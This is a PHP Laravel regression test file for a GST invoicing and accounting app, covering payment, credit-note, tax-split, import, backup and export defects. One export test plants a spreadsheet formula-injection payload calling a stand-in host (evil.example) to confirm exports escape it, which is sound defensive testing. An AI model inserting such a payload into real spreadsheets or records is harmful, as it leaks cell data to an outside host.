<?php

namespace Tests\Feature;

use App\Http\Controllers\CreditNoteController;
use App\Http\Controllers\InvoiceController;
use App\Models\Company;
use App\Models\CreditNote;
use App\Models\Customer;
use App\Models\Expense;
use App\Models\Invoice;
use App\Models\Product;
use App\Models\PurchaseBill;
use App\Models\Quotation;
use App\Models\State;
use App\Models\User;
use App\Models\Vendor;
use App\Services\Gstr3bBuilder;
use App\Services\ProfitAndLoss;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Carbon;
use Illuminate\Validation\ValidationException;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/**
 * Every money and compliance defect found in the October 2026 audit, kept as
 * a test so none of them can come back: double-submitted payments and credit
 * notes, API advances larger than the bill, stale GST splits at issue, credit
 * notes reversing more tax than charged, mirrored expense rows edited on their
 * own, IGST set-off, P&L drift between web and app, formula injection in
 * exports, and the rest.
 */
class MoneySafetyRegressionTest extends TestCase
{
    use RefreshDatabase;

    private User $user;
    private Company $company;
    private State $mh;
    private State $ka;
    private Customer $customer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->mh = State::factory()->create(['gst_code' => '27', 'name' => 'Maharashtra']);
        $this->ka = State::factory()->create(['gst_code' => '29', 'name' => 'Karnataka']);
        $this->user = User::factory()->create();
        $this->company = Company::factory()->create([
            'user_id' => $this->user->id, 'state_id' => $this->mh->id, 'gstin' => '27ABCDE1234F1Z5',
            'invoice_prefix' => 'INV', 'invoice_counter' => 0,
        ]);
        $this->user->forceFill(['active_company_id' => $this->company->id])->save();
        $this->customer = Customer::factory()->create([
            'user_id' => $this->user->id, 'company_id' => $this->company->id, 'state_id' => $this->mh->id, 'gstin' => null,
        ]);
    }

    private function draft(float $rate = 1000, float $gst = 18, array $extra = []): Invoice
    {
        $this->actingAs($this->user)->post(route('invoices.store'), array_merge([
            'customer_id' => $this->customer->id, 'invoice_date' => now()->toDateString(), 'due_date' => now()->toDateString(),
            'items' => [['description' => 'Widget', 'hsn_sac' => '84733010', 'quantity' => 1, 'rate' => $rate, 'gst_rate' => $gst]],
        ], $extra))->assertSessionHasNoErrors();

        return Invoice::latest('id')->firstOrFail();
    }

    private function issued(float $rate = 1000, float $gst = 18): Invoice
    {
        $inv = $this->draft($rate, $gst);
        $this->actingAs($this->user)->post(route('invoices.finalize', $inv))->assertSessionHasNoErrors();

        return $inv->fresh();
    }

    private function request(array $data): Request
    {
        $r = Request::create('/x', 'POST', $data);
        $r->setUserResolver(fn () => $this->user);

        return $r;
    }

    // ---- Sales --------------------------------------------------------

    public function test_a_double_submitted_payment_cannot_pay_the_invoice_twice(): void
    {
        $inv = $this->issued();
        $stale = Invoice::find($inv->id); // as a second tab or a retry sees it
        $pay = ['amount' => 1180, 'method' => 'cash', 'received_at' => now()->toDateString()];

        $this->actingAs($this->user)->post(route('invoices.payments', $inv), $pay)->assertSessionHasNoErrors();
        $this->expectException(ValidationException::class);
        try {
            app(InvoiceController::class)->recordPayment($this->request($pay), $stale);
        } finally {
            $this->assertEqualsWithDelta(1180.0, (float) $inv->fresh()->paid_amount, 0.001);
            $this->assertSame(1, $inv->payments()->count());
        }
    }

    public function test_a_double_submitted_credit_note_cannot_credit_more_than_the_invoice(): void
    {
        $inv = $this->issued();
        $stale = Invoice::find($inv->id);
        $cn = ['credit_note_date' => now()->toDateString(), 'amount' => 1180, 'reason' => 'rate_correction'];

        $this->actingAs($this->user)->post(route('credit-notes.store', $inv), $cn)->assertSessionHasNoErrors();
        $this->expectException(ValidationException::class);
        try {
            app(CreditNoteController::class)->store($this->request($cn), $stale);
        } finally {
            $this->assertSame(1, CreditNote::count());
        }
    }

    public function test_issuing_twice_keeps_the_first_number(): void
    {
        $inv = $this->draft();
        $stale = Invoice::find($inv->id);
        $this->actingAs($this->user)->post(route('invoices.finalize', $inv));
        $first = $inv->fresh()->invoice_number;

        $this->actingAs($this->user);
        app(InvoiceController::class)->finalize($this->request([]), $stale);

        $this->assertSame($first, $inv->fresh()->invoice_number);
        $this->assertSame(1, (int) $this->company->fresh()->invoice_counter);
    }

    public function test_a_draft_whose_customer_moved_state_is_not_issued_with_the_old_gst_split(): void
    {
        $inv = $this->draft();
        $this->travel(5)->minutes();
        $this->customer->update(['state_id' => $this->ka->id]);

        $this->actingAs($this->user)->post(route('invoices.finalize', $inv))->assertSessionHas('error');
        $this->assertTrue($inv->fresh()->isDraft());

        // Saved again, it is recomputed as IGST and issues.
        $this->actingAs($this->user)->put(route('invoices.update', $inv), [
            'customer_id' => $this->customer->id, 'invoice_date' => now()->toDateString(), 'due_date' => now()->toDateString(),
            'items' => [['description' => 'Widget', 'hsn_sac' => '84733010', 'quantity' => 1, 'rate' => 1000, 'gst_rate' => 18]],
        ]);
        $this->actingAs($this->user)->post(route('invoices.finalize', $inv));
        $inv->refresh();
        $this->assertFalse($inv->isDraft());
        $this->assertEqualsWithDelta(180.0, (float) $inv->total_igst, 0.001);
        $this->assertSame($this->ka->id, (int) $inv->place_of_supply_state_id);
    }

    public function test_credit_notes_never_reverse_more_tax_than_the_invoice_charged(): void
    {
        // 1 x 100.30 @18%: CGST 9.03 + SGST 9.03, total 118.36 -> 118.
        $inv = $this->issued(100.30, 18);
        $this->assertEqualsWithDelta(118.0, (float) $inv->grand_total, 0.001);
        foreach ([59, 59] as $amount) {
            $this->actingAs($this->user)->post(route('credit-notes.store', $inv), [
                'credit_note_date' => now()->toDateString(), 'amount' => $amount, 'reason' => 'rate_correction',
            ])->assertSessionHasNoErrors();
        }

        $this->assertEqualsWithDelta(9.03, (float) CreditNote::sum('total_cgst'), 0.001);
        $this->assertEqualsWithDelta(9.03, (float) CreditNote::sum('total_sgst'), 0.001);
        $this->assertEqualsWithDelta(100.30, (float) CreditNote::sum('taxable_value'), 0.001);
    }

    public function test_the_api_refuses_an_advance_larger_than_the_bill(): void
    {
        Sanctum::actingAs($this->user);
        $this->postJson('/api/invoices', [
            'customer_id' => $this->customer->id, 'invoice_date' => now()->toDateString(), 'paid_amount' => 5000,
            'items' => [['description' => 'Widget', 'hsn_sac' => '84733010', 'quantity' => 1, 'rate' => 1000, 'gst_rate' => 18]],
        ])->assertStatus(422)->assertJsonValidationErrors('paid_amount');
    }

    public function test_the_api_checks_the_books_lock_on_payments_and_accepts_the_last_paise(): void
    {
        $inv = $this->issued();
        $this->company->update(['books_locked_until' => now()->subDays(10)->toDateString()]);
        Sanctum::actingAs($this->user);

        $this->postJson("/api/invoices/{$inv->id}/payments", [
            'amount' => 100, 'method' => 'cash', 'received_at' => now()->subDays(20)->toDateString(),
        ])->assertStatus(422);

        $this->postJson("/api/invoices/{$inv->id}/payments", ['amount' => 1179.90, 'method' => 'cash', 'received_at' => now()->toDateString()])->assertCreated();
        $this->postJson("/api/invoices/{$inv->id}/payments", ['amount' => 0.10, 'method' => 'cash', 'received_at' => now()->toDateString()])->assertCreated();
        $this->assertSame('paid', $inv->fresh()->status);
    }

    public function test_api_credit_notes_skip_used_numbers_and_keep_the_refund_due(): void
    {
        $inv = $this->issued();
        // A number from last year that this year's counter would produce again.
        CreditNote::create([
            'user_id' => $this->user->id, 'company_id' => $this->company->id, 'invoice_id' => $inv->id,
            'credit_note_number' => 'CRN-0001', 'credit_note_date' => now()->subYear()->toDateString(),
            'amount' => 0.01, 'taxable_value' => 0, 'total_cgst' => 0, 'total_sgst' => 0, 'total_igst' => 0, 'reason' => 'rate_correction',
        ]);
        $inv->update(['credited_amount' => 0.01, 'balance' => 1179.99]);
        $this->actingAs($this->user)->post(route('invoices.payments', $inv), ['amount' => 1179.99, 'method' => 'cash', 'received_at' => now()->toDateString()]);

        Sanctum::actingAs($this->user);
        $this->postJson("/api/invoices/{$inv->id}/credit-notes", [
            'credit_note_date' => now()->toDateString(), 'amount' => 500, 'reason' => 'rate_correction',
        ])->assertCreated();

        $this->assertSame(2, CreditNote::count());
        $this->assertEqualsWithDelta(-500.0, (float) $inv->fresh()->balance, 0.001, 'refund owed to the customer');
    }

    public function test_deleting_a_converted_draft_over_the_api_reopens_the_quotation(): void
    {
        $inv = $this->draft();
        $quote = Quotation::factory()->create([
            'user_id' => $this->user->id, 'company_id' => $this->company->id, 'customer_id' => $this->customer->id,
            'quote_number' => 'QT-0001', 'status' => 'converted', 'converted_to_invoice_id' => $inv->id, 'converted_at' => now(),
        ]);
        Sanctum::actingAs($this->user);
        $this->deleteJson("/api/invoices/{$inv->id}")->assertOk();

        $this->assertSame('accepted', $quote->fresh()->status);
        $this->assertNull($quote->fresh()->converted_to_invoice_id);
    }

    // ---- Purchases and accounts ---------------------------------------

    private function vendor(?State $state, ?string $gstin = null): Vendor
    {
        return $this->company->vendors()->create(['user_id' => $this->user->id, 'name' => 'Vendor ' . uniqid(), 'state_id' => $state?->id, 'gstin' => $gstin]);
    }

    private function bill(Vendor $v, array $extra = []): PurchaseBill
    {
        $this->actingAs($this->user)->post(route('purchases.store'), array_merge([
            'vendor_id' => $v->id, 'bill_number' => 'B-' . uniqid(), 'bill_date' => now()->toDateString(), 'itc_eligible' => 1,
            'expense_category' => 'office_supplies', 'payment_method' => 'neft',
            'items' => [['description' => 'Parts', 'hsn_sac' => '84733010', 'quantity' => 1, 'unit' => 'NOS', 'rate' => 10000, 'gst_rate' => 18]],
        ], $extra))->assertSessionHasNoErrors();

        return PurchaseBill::latest('id')->firstOrFail();
    }

    public function test_an_expense_row_mirrored_from_a_purchase_invoice_cannot_be_changed_on_its_own(): void
    {
        $bill = $this->bill($this->vendor($this->mh, '27PQRST1234U1Z1'));
        $expense = Expense::findOrFail($bill->expense_id);

        $this->actingAs($this->user)->delete(route('finance.expenses.destroy', $expense))->assertRedirect(route('purchases.show', $bill));
        $this->actingAs($this->user)->get(route('finance.expenses.edit', $expense))->assertRedirect(route('purchases.edit', $bill));
        $this->assertNotNull($expense->fresh());

        Sanctum::actingAs($this->user);
        $this->deleteJson("/api/expenses/{$expense->id}")->assertStatus(422);
        $this->assertNotNull($expense->fresh());
    }

    public function test_a_vendor_with_a_gstin_and_no_state_is_taxed_by_the_gstin_state(): void
    {
        $this->actingAs($this->user)->postJson(route('vendors.store'), ['name' => 'Rao Steel', 'gstin' => '29ABCDE1234F1ZW'])->assertSuccessful();
        $vendor = Vendor::where('name', 'Rao Steel')->firstOrFail();
        $this->assertSame($this->ka->id, (int) $vendor->state_id);

        $bill = $this->bill($vendor);
        $this->assertEqualsWithDelta(1800.0, (float) $bill->total_igst, 0.001);
        $this->assertEqualsWithDelta(0.0, (float) $bill->total_cgst, 0.001);
    }

    public function test_a_purchase_invoice_cannot_be_cut_below_what_is_already_paid(): void
    {
        $vendor = $this->vendor($this->mh, '27PQRST1234U1Z1');
        $bill = $this->bill($vendor, ['paid_now' => 11800, 'paid_on' => now()->toDateString()]);

        $this->actingAs($this->user)->put(route('purchases.update', $bill), [
            'vendor_id' => $vendor->id, 'bill_number' => $bill->bill_number, 'bill_date' => now()->toDateString(), 'itc_eligible' => 1,
            'expense_category' => 'office_supplies',
            'items' => [['description' => 'Parts', 'hsn_sac' => '84733010', 'quantity' => 1, 'unit' => 'NOS', 'rate' => 5000, 'gst_rate' => 18]],
        ])->assertSessionHasErrors('items');

        $this->assertEqualsWithDelta(11800.0, (float) $bill->fresh()->grand_total, 0.001);
    }

    public function test_a_payment_made_with_the_bill_respects_the_books_lock(): void
    {
        $this->company->update(['books_locked_until' => now()->subDays(5)->toDateString()]);
        $this->actingAs($this->user)->post(route('purchases.store'), [
            'vendor_id' => $this->vendor($this->mh)->id, 'bill_number' => 'LOCK-1', 'bill_date' => now()->toDateString(), 'itc_eligible' => 1,
            'expense_category' => 'office_supplies', 'paid_now' => 100, 'paid_on' => now()->subDays(10)->toDateString(), 'payment_method' => 'cash',
            'items' => [['description' => 'Parts', 'hsn_sac' => '84733010', 'quantity' => 1, 'unit' => 'NOS', 'rate' => 1000, 'gst_rate' => 18]],
        ])->assertSessionHasErrors('paid_on');
        $this->assertSame(0, PurchaseBill::count());
    }

    public function test_expense_gst_cannot_exceed_the_highest_slab(): void
    {
        $this->actingAs($this->user)->post(route('finance.expenses.store'), [
            'entry_date' => now()->toDateString(), 'category' => 'rent', 'description' => 'Typo', 'amount' => 1000, 'gst_amount' => 18000, 'itc_eligible' => '1',
        ])->assertSessionHasErrors('gst_amount');
        $this->assertSame(0, Expense::count());
    }

    public function test_web_and_app_pnl_agree_and_count_credit_notes_blocked_gst_rcm_and_unpaid_bills(): void
    {
        $inv = $this->issued(10000, 18);                     // 10,000 + 1,800
        $this->actingAs($this->user)->post(route('credit-notes.store', $inv), [
            'credit_note_date' => now()->toDateString(), 'amount' => 5900, 'reason' => 'rate_correction',
        ]);
        $this->actingAs($this->user)->post(route('finance.expenses.store'), [
            'entry_date' => now()->toDateString(), 'category' => 'misc', 'description' => 'Staff lunch', 'amount' => 1000, 'gst_amount' => 180, 'itc_eligible' => '0',
        ]);
        $this->bill($this->vendor($this->mh), ['reverse_charge' => 1]); // unpaid; RCM 900 + 900

        $p = app(ProfitAndLoss::class)->summary($this->company, now()->startOfMonth(), now()->endOfMonth());
        $this->assertEqualsWithDelta(5000.0, $p['revenue']['taxable'], 0.001, 'net of the credit note');
        $this->assertEqualsWithDelta(1180.0 + 10000.0, $p['expense']['taxable'], 0.001, 'blocked GST is cost');
        $this->assertEqualsWithDelta(1180.0, $p['expense']['cash_out'], 0.001, 'the unpaid bill is not cash spent');
        // Output 900 + RCM 1,800 - ITC 1,800 (the RCM bill, eligible).
        $this->assertEqualsWithDelta(900.0, $p['gstPayable'], 0.001);

        Sanctum::actingAs($this->user);
        $api = $this->getJson('/api/finance/pnl?period=this_month')->assertOk();
        $this->assertEqualsWithDelta($p['revenue']['taxable'], (float) $api->json('revenue.taxable'), 0.001);
        $this->assertEqualsWithDelta($p['gstPayable'], (float) $api->json('gst_payable'), 0.001);
    }

    public function test_gstr3b_flags_credit_from_suppliers_without_a_gstin(): void
    {
        $this->bill($this->vendor($this->mh, null)); // eligible by default, but no GSTIN
        $d = app(Gstr3bBuilder::class)->build($this->company, now()->startOfMonth(), now()->endOfMonth());
        $this->assertEqualsWithDelta(1800.0, $d['itc_no_gstin'], 0.001);

        $this->actingAs($this->user)->get(route('finance.gstr3b', ['month' => now()->format('Y-m')]))
            ->assertOk()->assertSee('of this credit.', false)->assertSee('1,800');
    }

    public function test_exports_never_turn_user_text_into_a_formula(): void
    {
        Customer::factory()->create([
            'user_id' => $this->user->id, 'company_id' => $this->company->id, 'state_id' => $this->mh->id,
            'name' => '=HYPERLINK("http://evil.example?"&A1,"Open")', 'phone' => '+91 98765 43210',
        ]);

        $csv = $this->actingAs($this->user)->get(route('reports.export', ['report' => 'customers', 'format' => 'csv']))->streamedContent();
        $this->assertStringContainsString("\"'=HYPERLINK(", $csv);
        $this->assertStringContainsString('+91 98765 43210', $csv);
        $this->assertStringNotContainsString("'+91", $csv);

        // In the workbook the name is a text cell: no <f> (formula) element
        // anywhere in the sheet Excel opens.
        $res = $this->actingAs($this->user)->get(route('reports.export', ['report' => 'customers', 'format' => 'xlsx']));
        $path = tempnam(sys_get_temp_dir(), 'x') . '.xlsx';
        file_put_contents($path, $res->streamedContent());
        $zip = new \ZipArchive();
        $zip->open($path);
        $xml = $zip->getFromName('xl/worksheets/sheet1.xml') . ($zip->getFromName('xl/sharedStrings.xml') ?: '');
        $zip->close();
        @unlink($path);
        $this->assertStringContainsString('HYPERLINK', $xml);
        $this->assertDoesNotMatchRegularExpression('/<f[ >]/', $xml);
    }

    public function test_spreadsheet_prices_written_with_rs_read_correctly(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'imp') . '.csv';
        file_put_contents($path, "Item Name,HSN/SAC,Sale Price,GST %\nBolt,73181500,\"Rs. 1,200\",18\nNut,73181600,1200/-,18\n");
        $file = new UploadedFile($path, 'items.csv', 'text/csv', null, true);

        $token = $this->actingAs($this->user)->post(route('imports.preview', 'products'), ['file' => $file])->viewData('token');
        $this->actingAs($this->user)->post(route('imports.confirm', 'products'), ['token' => $token]);

        $this->assertEqualsWithDelta(1200.0, (float) Product::where('name', 'Bolt')->value('rate'), 0.001);
        $this->assertEqualsWithDelta(1200.0, (float) Product::where('name', 'Nut')->value('rate'), 0.001);
    }

    public function test_the_same_file_confirmed_from_two_previews_imports_once(): void
    {
        $make = function () {
            $path = tempnam(sys_get_temp_dir(), 'imp') . '.csv';
            file_put_contents($path, "Item Name,HSN/SAC,Sale Price,GST %\nBolt,73181500,100,18\n");

            return new UploadedFile($path, 'items.csv', 'text/csv', null, true);
        };
        $t1 = $this->actingAs($this->user)->post(route('imports.preview', 'products'), ['file' => $make()])->viewData('token');
        $t2 = $this->actingAs($this->user)->post(route('imports.preview', 'products'), ['file' => $make()])->viewData('token');
        $this->actingAs($this->user)->post(route('imports.confirm', 'products'), ['token' => $t1]);
        $this->actingAs($this->user)->post(route('imports.confirm', 'products'), ['token' => $t2]);

        $this->assertSame(1, Product::where('name', 'Bolt')->count());
    }

    public function test_the_hsn_report_is_net_of_credit_notes_like_gstr1(): void
    {
        $inv = $this->issued(10000, 18);
        $this->actingAs($this->user)->post(route('credit-notes.store', $inv), [
            'credit_note_date' => now()->toDateString(), 'amount' => 5900, 'reason' => 'rate_correction',
        ]);

        $csv = $this->actingAs($this->user)->get(route('reports.export', [
            'report' => 'hsn-summary', 'format' => 'csv', 'from' => now()->startOfMonth()->toDateString(), 'to' => now()->endOfMonth()->toDateString(),
        ]))->streamedContent();
        $this->assertStringContainsString('5000.00', $csv);
        $this->assertStringNotContainsString('10000.00', $csv);
    }

    public function test_the_backup_includes_purchases_vendors_credit_notes_and_memos(): void
    {
        $this->bill($this->vendor($this->mh, '27PQRST1234U1Z1'));
        $zipPath = app(\App\Services\BackupService::class)->buildZipForUser($this->user);
        $zip = new \ZipArchive();
        $zip->open($zipPath);
        $names = [];
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $names[] = basename($zip->getNameIndex($i));
        }
        $zip->close();
        @unlink($zipPath);

        foreach (['purchase_invoices.csv', 'purchase_invoice_items.csv', 'vendor_payments.csv', 'vendors.csv', 'credit_notes.csv', 'quotations.csv', 'cash_memos.csv'] as $f) {
            $this->assertContains($f, $names);
        }
    }
}
